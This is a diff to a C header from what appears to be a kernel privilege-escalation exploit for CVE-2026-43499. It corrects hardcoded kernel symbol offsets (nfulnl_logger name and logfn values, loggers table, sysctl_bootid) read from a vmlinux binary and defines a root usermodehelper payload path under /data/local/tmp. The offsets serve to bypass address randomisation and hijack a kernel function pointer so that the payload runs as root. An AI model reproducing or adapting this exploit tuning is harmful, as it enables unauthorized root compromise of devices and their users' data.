@@ -104,8 +104,8 @@
 #define SLIDE_SYSCTL_BOOTID_OFF             0x02c8d57cULL  /* sysctl_bootid         */
 #define SLIDE_LOGGERS_0_1_OFF               0x029c12c8ULL  /* loggers[0][1]         */
 #define SLIDE_NFULNL_LOGGER_OFF             0x029c1398ULL  /* nfulnl_logger         */
-#define SLIDE_NFULNL_LOGGER_NAME_OFF        0x0225c991ULL  /* nfulnl_logger.name value (ptr to "nfnetlink_log") */
-#define SLIDE_NFULNL_LOGGER_LOGFN_OFF       0x014a1778ULL  /* nfulnl_log_packet (value of nfulnl_logger.logfn) */
+#define SLIDE_NFULNL_LOGGER_NAME_OFF        0x0224c991ULL  /* nfulnl_logger.name value — read from vmlinux binary @ file_off=0x29c1398 */
+#define SLIDE_NFULNL_LOGGER_LOGFN_OFF       0x01a255b8ULL  /* nfulnl_logger.logfn value — read from vmlinux binary @ file_off=0x29c13a8 */
 
 /* ---- root usermodehelper ----------------------------------------------- */
 #define ROOT_HELPER_PATH            "/data/local/tmp/cve-2026-43499-root"
